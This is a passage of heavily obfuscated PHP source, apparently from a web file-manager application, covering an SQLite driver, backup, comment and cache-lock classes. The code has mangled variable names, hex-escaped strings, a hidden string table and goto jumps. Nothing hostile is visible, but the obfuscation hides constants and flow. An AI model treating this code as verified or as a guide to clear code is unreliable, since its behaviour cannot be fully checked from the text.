($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ë¦»ºéÌ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ôÚÁ× = sqlite_query($this->_linkID, $_SERVER[ë¦»ºéÌ][37]); if (!$ôÚÁ×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ç™›¦š = sqlite_query($this->_linkID, $_SERVER[ë¦»ºéÌ][38]); if (!$Ç™›¦š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $’•ôÔ¢ = array(); if ($this->numRows > 0) { for ($ÃÍ¯Ò¢² = 0; $ÃÍ¯Ò¢² < $this->numRows; $ÃÍ¯Ò¢²++) { $’•ôÔ¢[$ÃÍ¯Ò¢²] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $’•ôÔ¢; } public function getFields($ó˜¦–ğ„) { $í‘ë¾³Ñ =& $_SERVER[ë¦»ºéÌ]; $îä—ú¸ = $this->query($í‘ë¾³Ñ[39] . $ó˜¦–ğ„ . $í‘ë¾³Ñ[40]); $Ñ’û˜ó• = array(); if ($îä—ú¸) { foreach ($îä—ú¸ as $Í†¿Ş¸Ã => $—Âİ‚çÄ) { $Ñ’û˜ó•[$—Âİ‚çÄ[$í‘ë¾³Ñ[41]]] = array($í‘ë¾³Ñ[42] => $—Âİ‚çÄ[$í‘ë¾³Ñ[41]], $í‘ë¾³Ñ[43] => $—Âİ‚çÄ[$í‘ë¾³Ñ[44]], $í‘ë¾³Ñ[45] => (bool) ($—Âİ‚çÄ[$í‘ë¾³Ñ[46]] === $í‘ë¾³Ñ[12]), $í‘ë¾³Ñ[47] => $—Âİ‚çÄ[$í‘ë¾³Ñ[48]], $í‘ë¾³Ñ[49] => strtolower($—Âİ‚çÄ[$í‘ë¾³Ñ[50]]) == $í‘ë¾³Ñ[51], $í‘ë¾³Ñ[52] => strtolower($—Âİ‚çÄ[$í‘ë¾³Ñ[53]]) == $í‘ë¾³Ñ[54]); } } return $Ñ’û˜ó•; } public function getTables($¥•Ñí•† = '') { $ª›Üø…İ =& $_SERVER[ë¦»ºéÌ]; $²ıù§õ = $this->query($ª›Üø…İ[55] . $ª›Üø…İ[56] . $ª›Üø…İ[57]); $ª®üÛ = array(); foreach ($²ıù§õ as $Èïƒ‡Øú => $â¸ ¨Ïõ) { $ª®üÛ[$Èïƒ‡Øú] = current($â¸ ¨Ïõ); } return $ª®üÛ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ı«½¥áŠ =& $_SERVER[ë¦»ºéÌ]; $½ù£ãÙğ = sqlite_last_error($this->_linkID); $this->error = $½ù£ãÙğ . $ı«½¥áŠ[4] . sqlite_error_string($½ù£ãÙğ); if ($ı«½¥áŠ[12] != $this->queryStr) { $this->error .= LNG($ı«½¥áŠ[58]) . $this->queryStr; } think_trace($this->error, $ı«½¥áŠ[12], $ı«½¥áŠ[59]); return $this->error; } public function escapeString($“Ñ¢ÁÉ») { return sqlite_escape_string($“Ñ¢ÁÉ»); } public function parseLimit($ò¹ÒÙî) { $°§ƒÅ© =& $_SERVER[ë¦»ºéÌ]; $æ×­Êá = $°§ƒÅ©[12]; if (!empty($ò¹ÒÙî)) { $ò¹ÒÙî = explode($°§ƒÅ©[60], $ò¹ÒÙî); if (count($ò¹ÒÙî) > 1) { $æ×­Êá .= $°§ƒÅ©[61] . $ò¹ÒÙî[1] . $°§ƒÅ©[62] . $ò¹ÒÙî[0] . $°§ƒÅ©[63]; } else { $æ×­Êá .= $°§ƒÅ©[61] . $ò¹ÒÙî[0] . $°§ƒÅ©[63]; } } return $æ×­Êá; } } goto dÙøá‚éŸ; F©ƒÖ–¤ğ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x62\x61\x63\153\x75\160\114\151\163\164"; public $field = array("\151\x6f", "\x6e\x61\x6d\145", "\163\164\141\x74\x75\163", "\x63\157\x6e\164\145\156\164", "\x6d\141\156\x75\x61\x6c", "\x72\x65\x73\x75\154\x74", "\x74\x69\155\x65\106\x72\x6f\155", "\164\x69\x6d\x65\x54\x6f"); public function config() { $…¼æ‘Ô =& $_SERVER[ë¦»ºéÌ]; $ß³ËêìÛ = Model($…¼æ‘Ô[754])->get($…¼æ‘Ô[764]); $ß³ËêìÛ = json_decode($ß³ËêìÛ, !0); $ß³ËêìÛ = is_array($ß³ËêìÛ) ? $ß³ËêìÛ : array(); if (!isset($ß³ËêìÛ[$…¼æ‘Ô[739]])) { $ß³ËêìÛ[$…¼æ‘Ô[739]] = $…¼æ‘Ô[99]; } unset($ß³ËêìÛ[$…¼æ‘Ô[1602]]); Action($…¼æ‘Ô[1824])->taskInit(); Model($…¼æ‘Ô[1601])->cacheClear(); $ôÆš‚áÍ = $…¼æ‘Ô[1825]; $®ãÔİÛ‡ = Model($…¼æ‘Ô[1826])->findByKey($…¼æ‘Ô[1620], $ôÆš‚áÍ); if (!$®ãÔİÛ‡) { $®ãÔİÛ‡ = array(); } if (isset($®ãÔİÛ‡[$…¼æ‘Ô[208]])) { $®ãÔİÛ‡[$…¼æ‘Ô[208]] = json_decode($®ãÔİÛ‡[$…¼æ‘Ô[208]], !0); } if (isset($ß³ËêìÛ[$…¼æ‘Ô[208]])) { $®ãÔİÛ‡[$…¼æ‘Ô[208]][$…¼æ‘Ô[1605]] = $ß³ËêìÛ[$…¼æ‘Ô[208]]; unset($ß³ËêìÛ[$…¼æ‘Ô[208]]); } return array_merge($®ãÔİÛ‡, $ß³ËêìÛ); } public function listData($œõ³ÁÒØ = false, $İğ¼Õâ­ = "\x6d\157\x64\151\146\x79\124\151\x6d\x65", $î•Ï³æÇ = false) { return parent::listData($œõ³ÁÒØ, $İğ¼Õâ­, !0); } public function lastItem() { $€É©Ëú = $this->listData(); return !empty($€É©Ëú[0]) ? $€É©Ëú[0] : null; } public function kill($Æ½­ÊšÒ) { $¯œ‹‡Õğ =& $_SERVER[ë¦»ºéÌ]; $µ‰†ç›Ğ = $this->listData($Æ½­ÊšÒ); if (!$µ‰†ç›Ğ || empty($µ‰†ç›Ğ[$¯œ‹‡Õğ[42]])) { return !0; } Task::kill($¯œ‹‡Õğ[763]); Task::kill($¯œ‹‡Õğ[784]); Task::kill($¯œ‹‡Õğ[793]); $çŠ›’•â = $µ‰†ç›Ğ[$¯œ‹‡Õğ[42]]; $ÉÒŠÁäÖ = TEMP_FILES . $¯œ‹‡Õğ[762] . $çŠ›’•â . $¯œ‹‡Õğ[8]; IO::remove($ÉÒŠÁäÖ, !1); return $this->remove($Æ½­ÊšÒ); } public function remove($÷Áã¤ñ’) { $×Ø…Ó½û = $this->listData($÷Áã¤ñ’); if (!$×Ø…Ó½û) { return !0; } return $this->backupRemove($×Ø…Ó½û); } private function backupRemove($¥—ó³ÓÃ) { parent::remove($¥—ó³ÓÃ[$_SERVER[ë¦»ºéÌ][403]]); $ÈĞşœõê = $this->backupPath($¥—ó³ÓÃ); IO::remove($ÈĞşœõê, !1); return !0; } private function backupPath($ÛİÛÍá ) { $šÇÂ‚— =& $_SERVER[ë¦»ºéÌ]; $²„ÅËÌ˜ = $ÛİÛÍá [$šÇÂ‚—[42]]; $ëğÇ¸® = Model($šÇÂ‚—[754])->get($šÇÂ‚—[755]); $¥ËüóÍ = substr(md5($šÇÂ‚—[756] . $ëğÇ¸® . $²„ÅËÌ˜), 0, 8); return "\x7b\151\x6f\x3a{$ÛİÛÍá [$šÇÂ‚—[736]]}\x7d\x2f\144\141\164\141\142\141\163\x65\57\x62\141\143\x6b\165\160\x2f" . $²„ÅËÌ˜ . $šÇÂ‚—[11] . $¥ËüóÍ; } public function start() { $“Ù•ÍşÇ =& $_SERVER[ë¦»ºéÌ]; if ($GLOBALS[$“Ù•ÍşÇ[6]][$“Ù•ÍşÇ[100]][$“Ù•ÍşÇ[1827]] != $“Ù•ÍşÇ[99]) { return !0; } $˜ˆâ×¬¦ = $this->config(); if (!$˜ˆâ×¬¦ || $˜ˆâ×¬¦[$“Ù•ÍşÇ[1602]] != $“Ù•ÍşÇ[99]) { return !1; } $»‰íæÕÜ = $this->process(); foreach ($»‰íæÕÜ as $ë˜áÒ€¿) { if ($ë˜áÒ€¿) { return Task::restart($ë˜áÒ€¿[$“Ù•ÍşÇ[403]]); } } $¡¿ğ¿ = new Backup(); $¯ÂÈÑ¢» = $¡¿ğ¿->db(); if ($¯ÂÈÑ¢») { $¯ÂÈÑ¢» = $¡¿ğ¿->dbFile(); if ($¯ÂÈÑ¢» && $˜ˆâ×¬¦[$“Ù•ÍşÇ[739]] == $“Ù•ÍşÇ[202]) { $¯ÂÈÑ¢» = $¡¿ğ¿->file(); } } Backup::set(array($“Ù•ÍşÇ[734] => 1, $“Ù•ÍşÇ[498] => time())); return !0; } public function process() { $Æ€ —¶Û =& $_SERVER[ë¦»ºéÌ]; $²³© Õ¶ = array($Æ€ —¶Û[742] => Task::get($Æ€ —¶Û[763]), $Æ€ —¶Û[746] => Task::get($Æ€ —¶Û[784]), $Æ€ —¶Û[204] => Task::get($Æ€ —¶Û[793])); $ø‘ˆ¬½ = !1; foreach ($²³© Õ¶ as &$Åßá‡‘ş) { if ($ø‘ˆ¬½) { $Åßá‡‘ş = !1; continue; } if ($Åßá‡‘ş) { $÷•±¤š = intval(_get($Åßá‡‘ş, $Æ€ —¶Û[1637], 0)); if (time() - $÷•±¤š > 7200) { Task::kill($Åßá‡‘ş[$Æ€ —¶Û[403]]); $ø‘ˆ¬½ = !0; $Åßá‡‘ş = !1; } } } return $²³© Õ¶; } public function restore() { $¶÷•ô‚Ì =& $_SERVER[ë¦»ºéÌ]; ActionCall($¶÷•ô‚Ì[1040], !0, 1); ActionCall($¶÷•ô‚Ì[1040], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\x6d\145" => "\143\157\155\155\x65\x6e\x74\137\x6d\145\x74\141", "\155\x65\164\x61\106\x69\145\x6c\x64" => "\143\157\155\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($–°¢ÖäØ) { $ŸØõ‡œ¹ =& $_SERVER[ë¦»ºéÌ]; if ($–°¢ÖäØ[$ŸØõ‡œ¹[1828]]) { $ß°®–ú = $this->where(array($ŸØõ‡œ¹[1829] => $–°¢ÖäØ[$ŸØõ‡œ¹[1828]]))->find(); if (!$ß°®–ú || $ß°®–ú[$ŸØõ‡œ¹[414]] != $–°¢ÖäØ[$ŸØõ‡œ¹[414]] || $ß°®–ú[$ŸØõ‡œ¹[506]] != $–°¢ÖäØ[$ŸØõ‡œ¹[506]]) { return !1; } $this->where(array($ŸØõ‡œ¹[1829] => $–°¢ÖäØ[$ŸØõ‡œ¹[1828]]))->setAdd($ŸØõ‡œ¹[1830], 1); } $–°¢ÖäØ[$ŸØõ‡œ¹[1831]] = 0; $–°¢ÖäØ[$ŸØõ‡œ¹[1830]] = 0; $–°¢ÖäØ[$ŸØõ‡œ¹[734]] = 1; return $this->add($–°¢ÖäØ); } public function commentCount($¡ü™àö, $–èäÑäÏ, $ Âæúµ× = false) { $–ôªÏŒ =& $_SERVER[ë¦»ºéÌ]; if (!$¡ü™àö) { return array(); } if (is_string($¡ü™àö) || is_int($¡ü™àö)) { $¡ü™àö = array($¡ü™àö); } $Üû¥¨­ù = array($–ôªÏŒ[506], $–ôªÏŒ[1832] => $–ôªÏŒ[502]); $ŠíÍ»êØ = array($–ôªÏŒ[506] => array($–ôªÏŒ[7], $¡ü™àö), $–ôªÏŒ[414] => $–èäÑäÏ); if ($ Âæúµ×) { $ŠíÍ»êØ[$–ôªÏŒ[1632]] = $ Âæúµ×; } $ÇÇÀï“Ê = $this->field($Üû¥¨­ù)->where($ŠíÍ»êØ)->group($–ôªÏŒ[506])->select(); return array_to_keyvalue($ÇÇÀï“Ê, $–ôªÏŒ[506], $–ôªÏŒ[502]); } public function starTarget($’ÂËÜ‡º, $ŸŞ¶¡Êœ) { $Öü¾ÈÜÛ =& $_SERVER[ë¦»ºéÌ]; $àå³× = $’ÂËÜ‡º + self::TYPE_STAR_OFFSET; $·®ªÃÑ” = array($Öü¾ÈÜÛ[1632] => USER_ID, $Öü¾ÈÜÛ[414] => $àå³×, $Öü¾ÈÜÛ[506] => $ŸŞ¶¡Êœ); $²áãÓ¡ê = $this->where($·®ªÃÑ”)->find(); if ($²áãÓ¡ê) { return $this->where(array($Öü¾ÈÜÛ[403] => $²áãÓ¡ê[$Öü¾ÈÜÛ[403]]))->delete(); } $ÃÅ‘øİî = array($Öü¾ÈÜÛ[1828] => 0, $Öü¾ÈÜÛ[1632] => USER_ID, $Öü¾ÈÜÛ[734] => 1, $Öü¾ÈÜÛ[739] => $Öü¾ÈÜÛ[12], $Öü¾ÈÜÛ[414] => $àå³×, $Öü¾ÈÜÛ[506] => $ŸŞ¶¡Êœ, $Öü¾ÈÜÛ[1831] => 0, $Öü¾ÈÜÛ[1830] => 0); return $this->add($ÃÅ‘øİî); } public function starTargetCount($¦¤íˆÎ­, $¾ïá•¾é) { $ŒÖ“¿â =& $_SERVER[ë¦»ºéÌ]; $‚³äÆ²¿ = $¾ïá•¾é + self::TYPE_STAR_OFFSET; $ÛÀ¥øŸ = $this->commentCount($¦¤íˆÎ­, $‚³äÆ²¿); $°«˜ª› = $this->commentCount($¦¤íˆÎ­, $‚³äÆ²¿, USER_ID); return array($ŒÖ“¿â[1833] => $ÛÀ¥øŸ, $ŒÖ“¿â[1834] => $°«˜ª›); } public function starTargetUserList($…¸ª‘®, $è¸åŞş¦) { $áìğÒÓô =& $_SERVER[ë¦»ºéÌ]; $ü¦ôë°¼ = $…¸ª‘® + self::TYPE_STAR_OFFSET; $¾°üÂ»¸ = array($áìğÒÓô[506] => $è¸åŞş¦, $áìğÒÓô[414] => $ü¦ôë°¼); $³›ùëã = $this->where($¾°üÂ»¸)->count(); $àÁ¨€äé = array($áìğÒÓô[261] => $³›ùëã, $áìğÒÓô[1835] => array()); if (!$³›ùëã) { return $àÁ¨€äé; } $ø…Ü·ˆÔ = $this->field($áìğÒÓô[1632])->where($¾°üÂ»¸)->limit(500)->select(); $ø…Ü·ˆÔ = array_to_keyvalue($ø…Ü·ˆÔ, $áìğÒÓô[12], $áìğÒÓô[1632]); $àÁ¨€äé[$áìğÒÓô[1835]] = Model($áìğÒÓô[515])->userListInfo($ø…Ü·ˆÔ); return $àÁ¨€äé; } public function prasiseUserList($É½÷Ø¦İ) { $Û¹åÈ =& $_SERVER[ë¦»ºéÌ]; $îâÑ­Ğ = array($Û¹åÈ[1836] => $É½÷Ø¦İ); $öï¹†Ú = $this->where($îâÑ­Ğ)->find(); $Ø¢«èÃ = _get($öï¹†Ú, $Û¹åÈ[1831], 0); $Ä¿ğãñğ = array($Û¹åÈ[261] => $Ø¢«èÃ, $Û¹åÈ[1835] => array()); if (!$Ø¢«èÃ) { return $Ä¿ğãñğ; } $¿õ²â¼ = Model($Û¹åÈ[1837])->field($Û¹åÈ[1632])->where($îâÑ­Ğ)->limit(500)->select(); $¿õ²â¼ = array_to_keyvalue($¿õ²â¼, $Û¹åÈ[12], $Û¹åÈ[1632]); $Ä¿ğãñğ[$Û¹åÈ[1835]] = Model($Û¹åÈ[515])->userListInfo($¿õ²â¼); return $Ä¿ğãñğ; } public function remove($½¶Âá«) { $—ÃäºÉÒ =& $_SERVER[ë¦»ºéÌ]; $Âıëîˆù = array($—ÃäºÉÒ[1829] => $½¶Âá«); $­„ÏÌàü = $this->where($Âıëîˆù)->find(); if ($­„ÏÌàü[$—ÃäºÉÒ[1828]]) { $this->where(array($—ÃäºÉÒ[1829] => $­„ÏÌàü[$—ÃäºÉÒ[1828]]))->setAdd($—ÃäºÉÒ[1830], -1); } return $this->where($Âıëîˆù)->delete(); } public function edit($ˆòÚ‰¥ƒ, $±ÌôÆë) { $Óî’¡ =& $_SERVER[ë¦»ºéÌ]; $øºÙàÙå = array($Óî’¡[1829] => $ˆòÚ‰¥ƒ); return $this->where($øºÙàÙå)->save(array($Óî’¡[1838] => $±ÌôÆë)); } public function prasise($••—‰•ó) { $ù÷Üä§† =& $_SERVER[ë¦»ºéÌ]; $ëõ§ŞŸ³ = Model($ù÷Üä§†[1839]); $ğñ¿™´â = array($ù÷Üä§†[1829] => $••—‰•ó, $ù÷Üä§†[1623] => USER_ID); $ãÌÓæŸİ = $ëõ§ŞŸ³->where($ğñ¿™´â)->find(); if (!$ãÌÓæŸİ) { $ëõ§ŞŸ³->add($ğñ¿™´â); $«Åî÷·‹ = $this->where(array($ù÷Üä§†[1829] => $••—‰•ó))->setAdd($ù÷Üä§†[1831], 1); } else { $ëõ§ŞŸ³->where($ğñ¿™´â)->delete(); $«Åî÷·‹ = $this->where(array($ù÷Üä§†[1829] => $••—‰•ó))->setAdd($ù÷Üä§†[1831], -1); } return $«Åî÷·‹; } public function targetInfo($·¤ÖÒ…, $½³¼Ÿ­) { $ˆÌüèÖ© =& $_SERVER[ë¦»ºéÌ]; $şÇ´ğìñ = array($ˆÌüèÖ©[582] => $·¤ÖÒ…, $ˆÌüèÖ©[583] => $½³¼Ÿ­); $¬ãÌÔ¾ë = $this->where($şÇ´ğìñ)->count(); $ğ¸•¥¸Ö = "\x52\x49\x47\x48\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\143\x6f\x6d\155\145\x6e\164\137\x70\162\141\x69\x73\x65\40\x73\164\x61\x72\40\x6f\156\40\x63\157\155\x6d\145\x6e\164\x2e\143\157\155\x6d\145\x6e\x74\x49\104\40\x3d\40\x73\x74\x61\162\x2e\x63\157\x6d\155\x65\156\x74\111\x44"; $“±Ú¦ú = $this->alias($ˆÌüèÖ©[360])->where($şÇ´ğìñ)->join($ğ¸•¥¸Ö, $ˆÌüèÖ©[1840])->count(); $Áë€Æä£ = array($ˆÌüèÖ©[1841] => $¬ãÌÔ¾ë, $ˆÌüèÖ©[1842] => $“±Ú¦ú); return $Áë€Æä£; } public function listData($·“êˆ–Ø) { $Ö£ÉÒ© =& $_SERVER[ë¦»ºéÌ]; if (isset($·“êˆ–Ø[$Ö£ÉÒ©[1843]])) { if ($·“êˆ–Ø[$Ö£ÉÒ©[1843]]) { $·“êˆ–Ø[$Ö£ÉÒ©[1836]] = array($Ö£ÉÒ©[994], intval($·“êˆ–Ø[$Ö£ÉÒ©[1843]])); } unset($·“êˆ–Ø[$Ö£ÉÒ©[1843]]); } if (isset($·“êˆ–Ø[$Ö£ÉÒ©[1844]])) { if ($·“êˆ–Ø[$Ö£ÉÒ©[1844]]) { $·“êˆ–Ø[$Ö£ÉÒ©[1836]] = array($Ö£ÉÒ©[991], intval($·“êˆ–Ø[$Ö£ÉÒ©[1844]])); } unset($·“êˆ–Ø[$Ö£ÉÒ©[1844]]); } return $this->_listData($·“êˆ–Ø); } private function _listData($öØ×˜ºº) { $‹úó¨© =& $_SERVER[ë¦»ºéÌ]; $¦¸˜Òã² = $this->where($öØ×˜ºº)->_makeOrder()->selectPage(100); $this->_listAppendParent($¦¸˜Òã²[$‹úó¨©[375]]); $this->_listAppendUser($¦¸˜Òã²[$‹úó¨©[375]]); $this->_listAppendMeta($¦¸˜Òã²[$‹úó¨©[375]]); return $¦¸˜Òã²; } private function _makeOrder() { $…ƒŠˆÎ =& $_SERVER[ë¦»ºéÌ]; $šõÃüÑÈ = array($…ƒŠˆÎ[1831], $…ƒŠˆÎ[1830], $…ƒŠˆÎ[205]); $èÂßúÔ‚ = Input::get($…ƒŠˆÎ[457], $…ƒŠˆÎ[7], $…ƒŠˆÎ[426], $šõÃüÑÈ); $‚‹ö‘ØÖ = Input::get($…ƒŠˆÎ[458], $…ƒŠˆÎ[7], $…ƒŠˆÎ[1625], array($…ƒŠˆÎ[1845], $…ƒŠˆÎ[453])); $Ì‘²ôæê = $èÂßúÔ‚ . $…ƒŠˆÎ[63] . $‚‹ö‘ØÖ; return $this->order($Ì‘²ôæê); } private function _listAppendParent(&$ëéÛÂà) { $Ö¡›¢–Á =& $_SERVER[ë¦»ºéÌ]; $„…Ä£æ = array_unique(array_to_keyvalue($ëéÛÂà, $Ö¡›¢–Á[12], $Ö¡›¢–Á[1828])); $„…Ä£æ = array_remove_value($„…Ä£æ, $Ö¡›¢–Á[202]); if (!$„…Ä£æ) { return; } $û…Óå‰ = $this->where(array($Ö¡›¢–Á[1829] => array($Ö¡›¢–Á[7], $„…Ä£æ)))->select(); $û…Óå‰ = array_to_keyvalue($û…Óå‰, $Ö¡›¢–Á[1836]); foreach ($ëéÛÂà as &$í×øØ“å) { if (isset($û…Óå‰[$í×øØ“å[$Ö¡›¢–Á[1828]]])) { $í×øØ“å[$Ö¡›¢–Á[1846]] = $û…Óå‰[$í×øØ“å[$Ö¡›¢–Á[1828]]]; } } unset($í×øØ“å); } private function _listAppendUser(&$¸­”Â««) { $Û™ÃËµ  =& $_SERVER[ë¦»ºéÌ]; $Çà½ÏÏ = array_unique(array_to_keyvalue($¸­”Â««, $Û™ÃËµ [12], $Û™ÃËµ [1632])); $Çà½ÏÏ = array_remove_value($Çà½ÏÏ, $Û™ÃËµ [202]); if (count($Çà½ÏÏ) == 0) { return; } foreach ($¸­”Â«« as $¹‘Ûàßµ) { if (isset($¹‘Ûàßµ[$Û™ÃËµ [1846]])) { $Çà½ÏÏ[] = $¹‘Ûàßµ[$Û™ÃËµ [1846]][$Û™ÃËµ [1632]]; } } $‘¡Ñâ»Ò = Model($Û™ÃËµ [540])->userListInfo($Çà½ÏÏ); foreach ($¸­”Â«« as &$¹‘Ûàßµ) { $¹‘Ûàßµ[$Û™ÃËµ [596]] = $‘¡Ñâ»Ò[$¹‘Ûàßµ[$Û™ÃËµ [1632]]]; if (isset($¹‘Ûàßµ[$Û™ÃËµ [1846]])) { $¹‘Ûàßµ[$Û™ÃËµ [1846]][$Û™ÃËµ [596]] = $‘¡Ñâ»Ò[$¹‘Ûàßµ[$Û™ÃËµ [1846]][$Û™ÃËµ [1632]]]; } } unset($¹‘Ûàßµ); } private function _listAppendMeta(&$¶şüº”Ä) { $‰šÍø¸á =& $_SERVER[ë¦»ºéÌ]; $ìÆè…‰ = array_unique(array_to_keyvalue($¶şüº”Ä, $‰šÍø¸á[12], $‰šÍø¸á[1836])); $ìÆè…‰ = array_remove_value($ìÆè…‰, $‰šÍø¸á[202]); if (!$ìÆè…‰) { return; } foreach ($¶şüº”Ä as $ş½Ë¨¶²) { if (isset($ş½Ë¨¶²[$‰šÍø¸á[1846]])) { $ìÆè…‰[] = $ş½Ë¨¶²[$‰šÍø¸á[1846]][$‰šÍø¸á[1836]]; } } $Àì™±¤Ó = $this->metaList($ìÆè…‰); if (!$Àì™±¤Ó) { return !1; } foreach ($¶şüº”Ä as &$ş½Ë¨¶²) { $ş½Ë¨¶²[$‰šÍø¸á[467]] = $Àì™±¤Ó[$ş½Ë¨¶²[$‰šÍø¸á[1836]]]; if (isset($ş½Ë¨¶²[$‰šÍø¸á[1846]])) { $ş½Ë¨¶²[$‰šÍø¸á[1846]][$‰šÍø¸á[467]] = $Àì™±¤Ó[$ş½Ë¨¶²[$‰šÍø¸á[1846]][$‰šÍø¸á[1836]]]; } } unset($ş½Ë¨¶²); } private function metaList($¦àÚÙäş) { $à…ÍÆÓÏ =& $_SERVER[ë¦»ºéÌ]; if (!$¦àÚÙäş) { return array(); } $œÕò¤¬÷ = array($à…ÍÆÓÏ[1836] => array($à…ÍÆÓÏ[7], $¦àÚÙäş)); $¥ş‹å¤ä = Model($à…ÍÆÓÏ[1847])->where($œÕò¤¬÷)->select(); $¥ş‹å¤ä = array_to_keyvalue_group($¥ş‹å¤ä, $à…ÍÆÓÏ[1836]); foreach ($¥ş‹å¤ä as $Ä€¡×¥Ï => $€ò…×Î°) { $Şëê¦¤ = array(); foreach ($€ò…×Î° as $¤ìœüù—) { $Şëê¦¤[$¤ìœüù—[$à…ÍÆÓÏ[105]]] = $¤ìœüù—[$à…ÍÆÓÏ[380]]; } $¥ş‹å¤ä[$Ä€¡×¥Ï] = $Şëê¦¤; } return $¥ş‹å¤ä ? $¥ş‹å¤ä : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\145\137\x63\x6f\x6e\164\x65\156\164\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\x69\x6d\x65", "\164\151\155\145", "\x69\156\163\145\x72\x74", "\146\x75\x6e\x63\164\151\x6f\156")); } goto e¹à‹°‡Ì; fÉÙßïÅì’: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¤ ¯šİ =& $_SERVER[ë¦»ºéÌ]; $±–çà¥¦ = $GLOBALS[$¤ ¯šİ[6]][$¤ ¯šİ[355]]; self::$cachePath = $±–çà¥¦[$¤ ¯šİ[204]][$¤ ¯šİ[88]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ËÜµœ, $Éºœ× = 0) { $ÍÌ…æåÅ =& $_SERVER[ë¦»ºéÌ]; $åöÂÂ¬Ğ = microtime(!0); $Ššç¢Á = $åöÂÂ¬Ğ + $Éºœ× + 0.0001; $ŞİÓ–¡â = rtrim(self::$cachePath, $ÍÌ…æåÅ[8]) . $ÍÌ…æåÅ[843] . md5($ËÜµœ) . $ÍÌ…æåÅ[840]; if (file_exists($ŞİÓ–¡â) && filemtime($ŞİÓ–¡â) && filemtime($ŞİÓ–¡â) < time() - 10) { @unlink($ŞİÓ–¡â); } do { if (file_exists($ŞİÓ–¡â)) { cacheLockWait(); continue; } $ï¼çİá = fopen($ŞİÓ–¡â, $ÍÌ…æåÅ[844]); if (!$ï¼çİá) { return !1; } $Íº´öÃ— = flock($ï¼çİá, LOCK_EX | LOCK_NB); self::$caches[$ËÜµœ] = array($ÍÌ…æåÅ[845] => $ï¼çİá, $ÍÌ…æåÅ[204] => $ŞİÓ–¡â); fwrite($ï¼çİá, $Ššç¢Á); clearstatcache(); if ($ï¼çİá && $Íº´öÃ—) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ššç¢Á); $this->unlock($ËÜµœ); return !1; } public function lockGet($¾…ÀŠà°) { $ˆëŠ²ÖÃ =& $_SERVER[ë¦»ºéÌ]; $»Şƒ¦–Á = rtrim(self::$cachePath, $ˆëŠ²ÖÃ[8]) . $ˆëŠ²ÖÃ[843] . md5($¾…ÀŠà°) . $ˆëŠ²ÖÃ[840]; return file_exists($»Şƒ¦–Á); } public function unlock($ÏŸèğã¶) { $âˆ”Ïùè =& $_SERVER[ë¦»ºéÌ]; $¯¦ûÁõ = self::$caches[$ÏŸèğã¶]; if (!$¯¦ûÁõ) { return; } @flock($¯¦ûÁõ[$âˆ”Ïùè[845]], LOCK_UN); @fclose($¯¦ûÁõ[$âˆ”Ïùè[845]]); @unlink($¯¦ûÁõ[$âˆ”Ïùè[204]]); unset(self::$caches[$ÏŸèğã¶]); } } class CacheLockRedis { public function lock($Ÿ¾É¨¨¨, $µÖ¥¦ÜË = 10) { $¨è†·­Æ = Cache::init(); $ÑàÂ‰áá = microtime(!0) + $µÖ¥¦ÜË; while (microtime(!0) < $ÑàÂ‰áá) { $‹ºƒ³À÷ = $¨è†·­Æ->get($Ÿ¾É¨¨¨); if (!$‹ºƒ³À÷) { $¿”ËĞæ = $¨è†·­Æ->setLock($Ÿ¾É¨¨¨, $ÑàÂ‰áá, $µÖ¥¦ÜË); if ($¿”ËĞæ) { return !0; } } else { if ($‹ºƒ³À÷ < microtime(!0)) { $¨è†·­Æ->set($Ÿ¾É¨¨¨, $ÑàÂ‰áá, $µÖ¥¦ÜË * 2); if ($¨è†·­Æ->get($Ÿ¾É¨¨¨) === $‹ºƒ³À÷) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($è‡‡ƒ¤) { return Cache::init()->get($è‡‡ƒ¤); } public function unlock($”û’Ü ¤) { return Cache::init()->remove($”û’Ü ¤); } } class CacheLockMemcached { public function lock($óÔß™€ñ, $„…¾ÈÏ = 0) { $ËÊòâš = Cache::init(); $ïÂæò = microtime(!0) + $„…¾ÈÏ; while (microtime(!0) < $ïÂæò) { $‹É­Ê€¼ = $ËÊòâš->get($óÔß™€ñ); if (!$‹É­Ê€¼ || $‹É­Ê€¼ < microtime(!0)) { $ÍÍÚô¬ğ = $ËÊòâš->handle->add($óÔß™€ñ, $ïÂæò, $„…¾ÈÏ); if ($ÍÍÚô¬ğ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($âÄ¥ı€ê) { return Cache::init()->get($âÄ¥ı€ê); } public function unlock($ßµ¢Äø™) { return Cache::init()->remove($ßµ¢Äø™); } } goto FİƒøÖÒŸ; B“Ş®Úµ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ö§ë½ô¾ =& $_SERVER[ë¦»ºéÌ]; parent::startAfter(); Hook::bind($ö§ë½ô¾[1727], array($this, $ö§ë½ô¾[1722])); $í­–“×Ú =& $this->task; $í­–“×Ú[$ö§ë½ô¾[1724]] = $ö§ë½ô¾[1177]; if (!$í­–“×Ú[$ö§ë½ô¾[1532]]) { $í­–“×Ú[$ö§ë½ô¾[1532]] = LNG($ö§ë½ô¾[1728]); } } protected function endAfter() { $£İ»Ä™ =& $_SERVER[ë¦»ºéÌ]; parent::endAfter(); Hook::unbind($£İ»Ä™[1727], array($this, 